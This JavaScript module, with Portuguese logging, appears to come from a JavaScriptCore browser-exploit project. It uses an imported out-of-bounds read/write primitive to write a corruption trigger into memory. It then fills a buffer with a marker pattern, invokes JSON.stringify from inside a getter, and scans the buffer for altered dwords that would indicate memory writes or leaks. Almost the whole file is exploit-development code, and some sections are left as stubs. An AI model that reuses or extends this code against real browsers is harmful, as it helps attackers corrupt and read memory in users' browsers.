// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForStringifierLeakAnalysis";
let getter_called_flag = false;
let current_test_results = {
    success: false, message: "Teste não iniciado.", error: null,
    oob_writes_detected: [], 
    stringifier_output_length: 0, details: ""
};

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const OOB_AB_FILL_PATTERN_U32 = 0xABABABAB;
const OOB_AB_SNOOP_AREA_START = 0;
const OOB_AB_SNOOP_AREA_END = 0x800; 

let global_target_object_for_leak; 

class CheckpointForStringifierLeakAnalysis {
    constructor(id) {
        this.id_marker = `StrLeakAnalysisChkpt-${id}`;
        this.prop_to_leak_via_stringify = null; 
        this.other_data = "PAD_" + "X".repeat(32) + "_PAD";
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "StringifierLeakAnalysis_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results = { 
            success: false, message: "Getter chamado, analisando escrita do Stringifier.",
            error: null, oob_writes_detected: [], stringifier_output_length: 0, details:""
        };
        let details_log = []; // <--- Declarada aqui, no início do escopo da função getter
        let anomalia_detectada_na_sondagem = false;
        let internal_stringify_threw_error = false;
        let internal_stringify_error_msg = "";

        try {
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
                throw new Error("Dependências OOB R/W ou oob_ab não disponíveis no getter.");
            }

            logS3("DENTRO DO GETTER: Preenchendo oob_array_buffer_real com padrão...", "info", FNAME_GETTER);
            const fill_limit = Math.min(OOB_AB_SNOOP_AREA_END + 0x100, oob_array_buffer_real.byteLength);
            for (let offset = OOB_AB_SNOOP_AREA_START; offset < fill_limit; offset += 4) {
                if (offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) continue; // Não sobrescrever nosso gatilho (8 bytes)
                try { oob_write_absolute(offset, OOB_AB_FILL_PATTERN_U32, 4); } catch(e_fill) {}
            }
            details_log.push(`oob_array_buffer_real preenchido com ${toHex(OOB_AB_FILL_PATTERN_U32)} até ${toHex(fill_limit)}.`);

            let stress_obj_internal = {
                title: "InternalStressObject",
                target_in_stress: this.prop_to_leak_via_stringify, 
                long_str_1: "Val1_" + "L".repeat(60) + "_EndVal1",
                numbers: [Math.random(), Math.random(), Date.now()],
                nested_level1: {
                    sub_str: "SubStr_" + "S".repeat(50),
                    target_again: this.prop_to_leak_via_stringify
                }
            };
            details_log.push(`Objeto de stress interno (contendo target) criado.`);

            logS3("DENTRO DO GETTER: Chamando JSON.stringify INTERNO sobre objeto de stress...", "subtest", FNAME_GETTER);
            let internal_json_out_len = 0;
            try {
                let internal_json_out_str = JSON.stringify(stress_obj_internal);
                internal_json_out_len = internal_json_out_str.length;
                details_log.push(`Stringify interno completado. Output length: ${internal_json_out_len}.`);
                logS3(`DENTRO DO GETTER: JSON.stringify interno completado. Output length: ${internal_json_out_len}`, "info", FNAME_GETTER);
            } catch (e_json_int) {
                internal_stringify_threw_error = true;
                internal_stringify_error_msg = e_json_int.message;
                details_log.push(`Erro no JSON.stringify interno: ${e_json_int.message}`);
                logS3(`DENTRO DO GETTER: Erro no JSON.stringify interno: ${e_json_int.message}`, "error", FNAME_GETTER);
                if (!String(e_json_int.message).toLowerCase().includes("circular")) {
                    anomalia_detectada_na_sondagem = true; // Um erro incomum é uma anomalia
                    current_test_results.error = `Erro incomum stringify interno: ${e_json_int.message}`;
                }
            }
            current_test_results.stringifier_output_length = internal_json_out_len;

            logS3("DENTRO DO GETTER: Sondando oob_array_buffer_real por escritas/vazamentos...", "info", FNAME_GETTER);
            let snoop_hits_list = [];
            for (let offset = 0; (offset + 4) <= fill_limit; offset += 4) { 
                let skip_offset = false;
                if (offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) {
                     skip_offset = true; // Área do gatilho
                     try {
                        const val_trig_u32 = oob_read_absolute(offset, 4);
                         // Adicionar ao snoop_hits_list se for diferente do padrão, mesmo sendo trigger
                        if (val_trig_u32 !== OOB_AB_FILL_PATTERN_U32) {
                            snoop_hits_list.push({offset: toHex(offset), value_u32: toHex(val_trig_u32), value_u64_context: "N/A (Trigger Byte)", note: "Trigger Area Byte"});
                        }
                     } catch(e){}
                }
                if(skip_offset) continue;

                try {
                    const value_read_u32 = oob_read_absolute(offset, 4);
                    if (value_read_u32 !== OOB_AB_FILL_PATTERN_U32) {
                        let val64_ctx_str = "N/A";
                        if ((offset + 8) <= fill_limit) {
                            try { val64_ctx_str = oob_read_absolute(offset, 8).toString(true); } catch(e){}
                        }
                        const leak_msg = `ALTERAÇÃO oob_data[${toHex(offset)}]: ${toHex(value_read_u32)} (Padrão: ${toHex(OOB_AB_FILL_PATTERN_U32)}). Contexto 64bit: ${val64_ctx_str}`;
                        logS3(leak_msg, "leak", FNAME_GETTER);
                        snoop_hits_list.push({offset: toHex(offset), value_u32: toHex(value_read_u32), value_u64_context: val64_ctx_str, note: "Data Changed"});
                        anomalia_detectada_na_sondagem = true;
                    }
                } catch (e_snoop) {}
            }
            current_test_results.oob_writes_detected = snoop_hits_list;
            
            const actual_leaks = snoop_hits_list.filter(item => item.note === "Data Changed");
            if (actual_leaks.length > 0) {
                details_log.push(`${actual_leaks.length} DWORDS alterados (não padrão, não gatilho) encontrados.`);
                logS3(`DENTRO DO GETTER: ${actual_leaks.length} DWORDS ALTERADOS (NÃO PADRÃO) ENCONTRADOS NO OOB_AB!`, "vuln", FNAME_GETTER);
            } else {
                details_log.push("Nenhuma alteração de padrão (não gatilho) encontrada em oob_array_buffer_real.");
                 logS3("DENTRO DO GETTER: Nenhuma alteração de padrão (não gatilho) no oob_array_buffer_real.", "good", FNAME_GETTER);
            }

            if (anomalia_detectada_na_sondagem) {
                current_test_results.success = true;
                current_test_results.message = "Anomalias (escritas inesperadas em oob_ab ou erro incomum no stringify interno) detectadas!";
            } else if (internal_stringify_threw_error && String(internal_stringify_error_msg).toLowerCase().includes("circular")) {
                current_test_results.message = "Stringify interno falhou com erro de ciclo esperado. Nenhuma outra anomalia.";
            } else if (internal_stringify_threw_error) {
                 current_test_results.message = `Stringify interno falhou com: ${internal_stringify_error_msg}. Nenhuma outra anomalia.`;
            } else {
                current_test_results.message = "Nenhuma anomalia óbvia detectada ao estressar o Stringifier.";
            }
            
        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
            current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
        }
        // Certifique-se de que details_log é atribuído mesmo se houver um erro principal
        current_test_results.details = details_log.join('; ');
        return { "getter_processed_stringifier_leak_analysis_v3": true };
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForStringifierLeakAnalysis.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_str_leak_analysis_v3_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() { 
    const FNAME_TEST_RUNNER = "executeStringifierLeakAnalysisRunnerV3";
    logS3(`--- Iniciando Teste de Análise de Escrita do Stringifier (v3) ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { /* Reset inicial */ };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        const checkpoint_obj = new CheckpointForStringifierLeakAnalysis(1);
        global_target_object_for_leak = { "secret_marker_val": 0xBADF00D + Math.floor(Math.random()*255) };
        checkpoint_obj.prop_to_leak_via_stringify = global_target_object_for_leak;
        logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}, prop_to_leak_via_stringify preenchida.`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) { /* ... */ }

    } catch (mainError_runner) { /* ... */ }
    finally { /* ... */ }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE ESCRITA STRINGIFIER (v3): SUCESSO ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO TESTE ESCRITA STRINGIFIER (v3): Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        if (current_test_results.details) {
             logS3(`  Detalhes da tentativa no getter: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
        }
        if (current_test_results.oob_writes_detected && current_test_results.oob_writes_detected.length > 0) {
            logS3("--- Dados Alterados/Vazados no oob_array_buffer_real ---", "leak", FNAME_TEST_RUNNER);
            current_test_results.oob_writes_detected.forEach(item => {
                logS3(`  Offset ${item.offset}: U32=${item.value_u32}, Contexto U64=${item.value_u64_context} ${item.note ? '('+item.note+')':''}`, "leak", FNAME_TEST_RUNNER);
            });
        }
         if (current_test_results.error) { /* ... */ }
    } else { /* ... */ }

    clearOOBEnvironment();
    global_target_object_for_leak = null;
    logS3(`--- Teste de Análise de Escrita do Stringifier (v3) Concluído ---`, "test", FNAME_TEST_RUNNER);
}
